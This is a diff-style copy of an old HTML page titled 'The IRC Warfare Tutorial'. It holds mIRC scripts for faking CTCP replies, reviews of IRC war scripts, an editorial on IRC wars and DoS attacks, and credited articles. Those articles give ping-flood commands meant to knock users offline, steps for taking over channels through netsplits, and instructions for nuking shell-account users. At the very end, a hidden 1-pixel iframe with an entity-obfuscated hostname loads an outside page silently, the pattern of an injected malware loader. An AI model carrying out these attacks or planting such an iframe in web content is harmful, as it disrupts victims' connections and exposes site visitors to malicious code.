+for Client Protocol} CTCP replies, ie.&nbsp; VERSION, TIME, FINGER, PING&nbsp;&nbsp;
+replies on you. These replies can get you in a lot of trouble, mainly its
+a way for people to gather information about you then start up an attack.&nbsp;
+Now it is time to change the replies your mirc will give in a way to cause
+the other end to be fooled. Well this topic has been covered by many writers
+and warscript developers, but many don't know about changing the replies
+to their advantage, well look no further, here we go!
+
+<P>One of the most devistating attacks can come from a VERSION reply.
+
+<P>To do a ctcp&nbsp; version reply&nbsp; on a user, all you have to do
+is type:
+<BR>"/ctcp &lt;nick> VERSION " This will return the nick's irc client.
+Now you may ask why is that important? Well lets say your using mirc 5.7x
+which suffers from heap overflow of 217 bytes, and 5.8 heap overflow of
+226 bytes&nbsp; by knowing your version an attacher already knows which
+operating system your using and a version, so they can hack you without
+a trojan and you won't know it happened.
+<BR>Lets kill the version reply to either give a fake reply or no reply
+at all so they can sit there waiting, lol.
+<BR>Okay you will need a hex editor for this, I recomment Hiew, get it
+<A HREF="http://protocols.cjb.net">here!</A>
+<BR>-make a backup of your mirc32.exe.
+<BR>-install hiew, load it up, once you have clicked mirc32.exe now you
+will see some garbage, click F7 that should popup the search box, type
+in VERSION you should be able to find the reply something like mIRC32 v5.8
+K.Mardam-Bey. Now just delete the reply. If you have trouble doing it with
+Hiew then get another hex editor, there are many around but its the best.
+So save and exit. Now you can chose to have no Version reply to make your
+attacker suffer from waiting when there isn't going to be a reply or you
+can fake your reply to trick him.
+<BR>Lets trick the attacker:
+
+<P>Load up you mirc, then goto&nbsp; the tools menu, then click " Remote
+". There you should see a box,
+<BR>now simply write this mini script,
+<BR>&nbsp;
+<CENTER><TABLE BORDER=0 CELLSPACING=0 CELLPADDING=0 COLS=1 WIDTH="80%" BGCOLOR="#666666" >
+<TR>
+<TD><B><FONT COLOR="#FF9900">&nbsp;ctcp 1:VERSION:{</FONT></B>&nbsp;
+<BR><B><FONT COLOR="#FF9900">&nbsp;.notice $me Recieved CTCP VERSION from
+$nick $+ / $+ $site</FONT></B>&nbsp;
+<BR><B><FONT COLOR="#FF9900">&nbsp;ctcpreply $nick VERSION "write your
+reply here, make it funny" |&nbsp; halt</FONT></B>&nbsp;
+<BR><B><FONT COLOR="#FF9900">&nbsp;}</FONT></B></TD>
+</TR>
+</TABLE></CENTER><BR>
+So now we have faked our ctcp reply it should look like this, if we faked
+it to have no reply
+
+<P>/ctcp Mikkkeee VERSION
+
+<P>-> [Mikkkeee] VERSION
+<BR>-
+<BR>[Mikkkeee VERSION]
+<BR>-
+<BR>&nbsp;
+
+<P>Well now the attacker will keep waiting and waiting.
+
+<P>Lets fake some more,
+<BR>Another ctcp reply that can be of usage is /ctcp &lt;nick> PING
+<BR>This reply of your ping will tell the attacker&nbsp; the speed of your
+connection and if your lagging, wink wink he might want to do a dos attack
+and boot you, so lets fake the reply to our advantage.
+<BR>Same as above write this mini script in our tools, then "remote"
+
+<BR>&nbsp;
+<CENTER><TABLE BORDER=0 CELLSPACING=0 CELLPADDING=0 COLS=1 WIDTH="61%" BGCOLOR="#666666" >
+<TR>
+<TD><B><FONT COLOR="#FF9900">&nbsp;ctcp 1:PING:{</FONT></B>&nbsp;
+<BR><B><FONT COLOR="#FF9900">&nbsp;ctcpreply $nick PING&nbsp; "your pings
+number in sec" | halt</FONT></B>&nbsp;
+<BR><B><FONT COLOR="#FF9900">&nbsp;}</FONT></B></TD>
+</TR>
+</TABLE></CENTER><BR>
+Usually I have mine set to 1 sec , but you can make it funny like 690263165
+sec, which would leave the attacker fooled/confused.
+
+<P>Another reply that can cause you a bit of harm is /ctcp &lt;nick > TIME&nbsp;
+which will send the other user, your local time/date. This is very bad
+cause if your busy trying to bounce your ip over wingates and proxys and
+now your ip is somewhere in Asia, and someone does ctcp TIME then they
+will know your true&nbsp; location in the world, which can hurt your spoofing
+tricks.
+<BR>So lets fake it to our advantage!
+
+<BR>&nbsp;
+<CENTER><TABLE BORDER=0 CELLSPACING=0 CELLPADDING=0 COLS=1 WIDTH="60%" BGCOLOR="#666666" >
+<TR>
+<TD><B><FONT COLOR="#FF9900">&nbsp; ctcp 1:TIME:{</FONT></B>&nbsp;
+<BR><B><FONT COLOR="#FF9900">&nbsp; ctcpreply $nick TIME&nbsp; "your new
+time" | halt</FONT></B>&nbsp;
+<BR><B><FONT COLOR="#FF9900">&nbsp; }</FONT></B></TD>
+</TR>
+</TABLE></CENTER><BR>
+your new time can be something like, Tue Jun 12 22:23:17 1989&nbsp;&nbsp;
+be creative!
+
+<P>Another ctcp reply that can be used to gather some info on you is /ctcp
+&lt;nick> FINGER
+<BR>its not a big deal but it simply replies what you have told it to reply,
+so just fake everything.
+<BR>hope that helps!
+<BR>
+
+<P><B><U>[<A NAME="https"></A>How to spoof via https proxys]</U></B>
+
+<P>Now this idea is very creative, and I just found a little program that
+you can use to do it.&nbsp; It is called <A HREF="http://deny.de/sss/telplug.html">ThroughTheFire
+0.9 </A>which is able to spoof your ip via https proxys. It is a new innovation
+in spoofing, lol !You can also use this program to spoof telnet and i guess
+ftp sufing. Well all you have to do now is find working https proxy lists.
+To do so just type in <A HREF="http://ww.altavista.com">ww.altavista.com</A>
+<BR>+"Https proxy" and you should get some results, maybe not working results.
+Read the
+<BR><A HREF="http://blacksun.box.sk/search2.txt">Search Engines Ripped
+Apart</A> tutorial&nbsp; to see other methods on using search engines.
+<BR>&nbsp;
+<BR>&nbsp;
+
+<P><A NAME="warscript"></A><B><U>[War Scripts]</U></B>
+<BR>War scripts are usually scripts for IRC clients that contain features
+like Mass DEOP / Kick, channel takeover options, nukers, flooders, clones
+and sometimes bots. Some scripts even contain some nice and funny features
+that don't necessarily have something to do with IRC Warfare.
+
+<P>In this section I will briefly cover some of the more known war scripts
+and their features.
+
+<P>7th Sphere Script (c) 1996-1997 7th Sphere Enterprises
+<BR>Support@7thSphere.com - http://www.7thSphere.com
+<BR>Pros: Easy setup, Nice protections, Automatically runs the Click nuker
+and fills-in all the needed values.
+<BR>Cons: Protections are not customizable enough. Channel Takeover doesn't
+mass kick / ban the channel.
+
+<P><A HREF="http://www.tribe.roxx.ircnet.mcmail.com/">TRiBE (t7)</A> By
+kefz(tribe)
+<BR>Pros: Excellent protections, Excellent socket flood clones and firewall
+flood clones. The best I have ever seen! Comes with a great set of utilities.
+Can automatically run click with all the options pre-configured. Excellent
+set of scripts / clients / bots exploits / backdoors.
+<BR>Cons: None! Go get this script now!
+
+<P><A HREF="http://www.pairc.com/pnp/400.html">Peace and Protection 4.0</A>
+<BR>Pros: Get it and see for your self, simply a work of art!
+<BR>Cons: Too many good tools, lol
+
+<P><A HREF="http://www.modx.co.uk/wangproducts/index.htm">Wang Script 3.5
+pro</A>
+<BR>Pros: Wang Clone, Trojan scan, Password protection, nickname find,
+ctcp masking, email checking/sending, clone scanner, anti takeover, info
+finder, takeover, fake dcc's, telnet, wartools addons.
+<BR>Cons: NONE!
+
+<P><A NAME="editorial"></A><B><U>[Editorial - IRC wars, another perspective]</U></B>
+<BR>Note: Most of this is taken from an article that was written by Ntd
+(ntd@mirc.net). I feel that this article has the best perspective about
+the IRC wars.
+<BR>Note 2: If you are a newbie and you think IRC wars are a great form
+of hacking, and doing complex attacks you might want to skip this chapter
+and read it another time.
+
+<P><B>IRC WAR? A LOAD OF SILLY NUKES</B>
+<BR>Right, first things first, nukes - or properly, Denial of Service (DoS)
+attacks - are technically nothing to do with IRC war. They operate directly
+from the attacker to the victim's IP, and IRC comes into it only inasmuch
+as it gives the attacker a ready source of IP addresses to attack, and
+perhaps a "motive" for doing it (e.g, "they banned me!"). But, attackers
+could just as easily collect IPs from services such as ICQ (which, incidentally,
+has to be one of the most idiotically insecure protocols ever invented,
+yet many people who bemoan IRC attack happily run ICQ, and probably don't
+even check the option to hide their IP which is useless anyway because
+there are lot of patches that will always show you the IP even if the user
+chose to hide it).
+
+<P><B>IRC WAR DOESN'T HELP IMPROVE SECURITY</B>
+<BR>Surely the stupidest argument against IRC war, is that unlike other
+forms of hacking, it does not help anybody because it doesn't contribute
+to increased security. There is a mass of evidence showing quite clearly
+that this is not the case. Why did Microsoft release a winsock that was
+not vulnerable to the port 139 OOB nuke? Because that nuke became so widely
+abused. Why do current versions of mIRC have an option to only enable the
+identd server during connection? Because mIRC 5.3 had an ident exploit
+with which mIRC could be crashed. Why, in fact, have flood attacks become
+so obsolete? Because ircds now contain anti-flood code written directly
+in response to flood abuse. Of course these attacks are irritating and
+disruptive at the time, but in the long term they have undoubtedly led
+to more secure code in operating systems, clients and irc daemons.
+
+<P><B>IRC WAR IS NOT REAL HACKING</B>
+<BR>Again, this stems from a misunderstanding of what IRC war is. Essentially
+there are two types: TCP/IP attacks (ICMP nuke, smurf, fraggle, ping of
+death) and ircd based attacks (nick collisions, lag collisions, serverops,
+hacking o:lines, bogus bans). While the first category are almost exclusively
+"lame cracking" (that is, the user needs only to download a program and
+can then use it without any actual knowledge), the second category is more
+ambiguous. I know one person who finds many exploits by working with the
+ircd code (which is of course almost always free for download) - and finding
+bugs by working with the source is as "real" as hacking can get. Within
+a few days of their implementation he found ways of bypassing the ircnet
+ircd patches designed to protect against open socks servers and deliberate
+nick collisions. He even found a method by which a normal client could
+completely crash a server remotely. And what did he do with this knowledge...?
+
+<P><B>DOS ATTACKS</B>
+<BR>Yes, they are illegal, and yes they are disruptive. Furthermore, many
+DoS attacks affect many more people than those targeted, the most obvious
+example being the smurf attack. I am one of a group of friends who run
+a few of the biggest channels on ircnet, and these channels are regularly
+attacked by war groups intent on taking them. I make no exaggeration when
+I say that several times a week, if not everyday, members of the original
+channel opers complain that they are being smurfed by members of groups
+attempting to take the channel. These smurf attacks are capable of taking
+down entire ISPs and that IRC warriors recklessly use these attacks against
+single users just to take an irc channel is utterly inexcusable in my opinion.
+
+<P><B>MOTIVATION</B>
+<BR>While there are some IRC warriors / hackers like the individual I described
+above, it is sadly true that there are many more who are acting from more
+dubious motives. To the people who resort to floods, nukes and such tools
+just because they are banned from channels, I say: you need to get out
+more. What, then is my basic point? My conclusion is that IRC abuse and
+hacking is like any other branch of hacking - it ranges from the incredibly
+basic and lame to the actually quite skilled and beneficial. At the one
+end are the classic 13 year old hax0r wannabes with their CLICK.EXE, and
+I am in no way suggesting these people's behaviour should be excused or
+tolerated. However, I urge you all to be aware that at the other end of
+the scale exist talented, knowledgeable hackers discovering and revealing
+bugs in clients, OSes and ircds by a variety of methods and in doing so
+making IRC more secure for all of us.
+
+<P>&nbsp;<A NAME="packet"></A><B><U>[Some intresting articles by Packet]</U></B>
+
+<P>=[Ping Flooding]=
+
+<P>1. =What is a ping?=
+<BR>A ping is a small file (often 32 bytes) that is sent to another computer
+online,
+<BR>in which the other computer replys. Basicly it is saying "hello" to
+another
+<BR>computer. With this is also shows how long it took for the ping to
+get there
+<BR>and back.
+
+<P>2. =So why is this usefull to me?=
+<BR>Well it can and it can not be usefull. If you are going to play a game
+like
+<BR>quake/quake2 on a server, the faster the ping gets there and back the
+better.
+<BR>Also, if you are on a fast connection you can nock people of there
+ISP
+<BR>temperarily. This is called ping flooding, and can work very well.
+The best
+<BR>thing to flood with is a T1 or better. Even if you don't have more
+than a
+<BR>28.8 you can lag or kill someone. Here is an example of how ping works
+
+<P><in dos prompt>
+<BR>C:\ping 24.131.12.124
+
+<P>this would send a few 32byte packets to that host. Now, this won't do
+much
+<BR>by itself...but there are more features to pinging that make it very
+usefull.
+<BR>this is the command I often use
+
+<P>C:\ping -l 2800 -t -w 2000 24.131.12.124
+<BR>(good for 28.8 users)
+
+<P>-l is the size of the packet to send, generaly you want to keep trying
+higher
+<BR>numbers till you find the very most there connection can take....soon
+they
+<BR>will be to lagged to do much, or get killed. -w is how long it waits
+till it
+<BR>decides to time out.... -t keeps pinging the IP untill you hit CTRL+Break
+
+<P>there are some other cool switches like -n wich echo floods them, and
+-v
+<BR>witch specifys the Terms Of Service
+
+<P>=[Net Splits]=
+
+<P>1. =[What is a NetSplit]=
+<BR>The large irc servers work, is they link together to provide less lag
+and a
+<BR>local server to many people. They link together so that people can
+talk and
+<BR>do what ever and not have to be on the same server. What a netsplit
+is, is
+<BR>when one server is lagged enough it breaks off from the rest of the
+servers
+<BR>then becoming its own stand alone server untill it merges again.
+
+<P>2. =[Why Does this matter?]=
+<BR>Well it can and it can't matter....It is possible to take over a channel
+<BR>through netsplits. So it can matter if you want to protect yourself
+from
+<BR>this, or do it yourself.
+<BR>&nbsp;
+
+<P>3. =[How do I protect myself?]=
+<BR>The only way is to have netsplit protection. Alot of people do not
+like this
+<BR>script, and I do not recomend using it unless you think someone is
+trying to
+<BR>take your channel. When servers merge it trys to restore the settings
+as it
+<BR>was before the split. So if you were a channel operator the server
+would OP
+<BR>you, reset the modes etc etc. When someone takes a channel by a netsplit
+they
+<BR>get opped by the server, so the script deops anyone who is opped by
+the server.
+<BR>If you do use this script, make sure people can op themselves automaticly
+by
+<BR>sending you a message. ...
+
+<P>4. =[How do I take a channel through this?]=
+<BR>First you need a link looker, (which comes with this script). What
+a link
+<BR>looker does is search for servers that are about to or have broken
+off. When
+<BR>you find a server that has broken off, you need to quickly join that
+server
+<BR>and go into the channel you want to take over. If no one else is on
+that server
+<BR>you will be a channel operator. But this is not all you have to do,
+because
+<BR>when the servers merge again it will deop you. You need to run the
+Dysnch script
+<BR>which will fill the channel with bans and diffrent modes. Hopefully
+it will
+<BR>screw up the already screwed channel enough that when the merge happens
+it
+<BR>thinks you were a channel operator and you keep your OPS. Then you
+need to
+<BR>quickly run the takeover script so that none of the netsplit protection
+(if
+<BR>there are any) scripts deop you.
+
+<P>=[Advanced Nuking]=
+
+<P>Nuking is fun for the whole family, but sometimes it's not just "wham
+bam thank you ma'am". On
+<BR>occasion, it requires you to be a little creative to successfully nuke
+someone. hopefully
+<BR>we will give you some ideas on how to become a pheared nuker.
+
+<P>** Open ports:
+<BR>In order to become a successful nuker, you must learn to find as much
+information about your
+<BR>target as possible. One of the most important elements to nuking is
+finding the right ports
+<BR>to nuke. the default IRC server ports are 6660-6669, with 6667 being
+the most commonly used.
+<BR>One thing you may discover throughout your nuking 'career' is that
+most servers offer different
+<BR>ports that are open for IRCing. The easiest way to find out the open
+ports is to check the
+<BR>Message Of the Day, for 90% of all IRC servers will list their open
+ports in the motd. To get
+<BR>the message of the day simply type '/motd irc.server.net'. This will
+display the motd and allow
+<BR>you to find the open ports (usually). Now you can nuke these ports,
+increasing your chances of
+<BR>success.
+
+<P>** Their Connection:
+<BR>Another thing you may want to do is find out whether your target is
+on a shell account, or a
+<BR>dial-up account. Under normal circumstances, dial-up users are easier
+to nuke then shell accounts
+<BR>for reasons we won't go into right now. To find out which they are
+using, simply take the last
+<BR>part of their IP and try to visit to the ISP's homepage. Again, there
+are many servers that
+<BR>will describe their services on their web-page. Usually, if their ip
+is two or three legible
+<BR>words only interupted by a period, then it is a shell. For instance,
+<BR>"jkrondike@mainsys.postex.net" would most likely be a shell account,
+while
+<BR>"yourmom@modem29.er.actil.net" is usually a dial-up.
+
+<P>** Nuking Shell Users:
+<BR>If you're using windows, you should download a program that will allow
+you to finger a server.
+<BR>Cyberkit is a good program, for it has Ping, Finger, Traceroute, etc.
+<BR>get it at http://www.ping.be/cyberkit/cyber.zip, or go find one of
+your own. there are hundreds
+<BR>to choose from. (no we're not being endorsed by cyberkit, it's just
+a kickass proggie)
+<BR>Most shell account users will login from a dial-up account, and if
+finger is running on their
+<BR>shell, it should display the dial-up IP address. Finger the server
+and once you know this, use
+<BR>your nuker to disconnect them from their shell by replacing the IRC
+server with their shell
+<BR>account address, and use the IP you found through finger as the client.
+Use ports 22 24 as the
+<BR>server ports, in place of 6660 6669. Port 23 is the default telnet
+port, so nuking from 22 to 24
+<BR>will effictivly disconnect them from their shell account. this usually
+causes your target to
+<BR>quit irc with "Where did my controling terminal go?" quit message.
+it's pretty funny when it
+<BR>works.
+
+<P><A NAME="bib"></A><B><U>[Bibliography]</U></B>
+<BR>My personal experience.
+<BR>IRCing with telnet - Understanding IRC protocol, by ech0 Security -
+HTTP: <A HREF="http://ech0.cjb.net">http://ech0.cjb.net</A>.
+<BR>Request for Comments (RFC): #1459, May 1993, By J. Oikarinen and D.
+Reed
+<BR>Black Sun Research Facility (<A HREF="http://blacksun.box.sk">blacksun.box.sk</A>).
+<BR>IRC War, Another Perspective - by Ntd
+<BR>Some articles by some guy named Packet.
+
+<P>The IRC Warfare Tutorial / Written by <A HREF="mailto:talrun@actcom.co.il">The
+Cyber God</A> | Updated , 7/20/01 by <A HREF="mailto:rammal81@hotmail.com">Mikkkeee</A>
+<BR>My ICQ#: 7864557
+
+<P>EOF
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</BODY>
+</HTML>
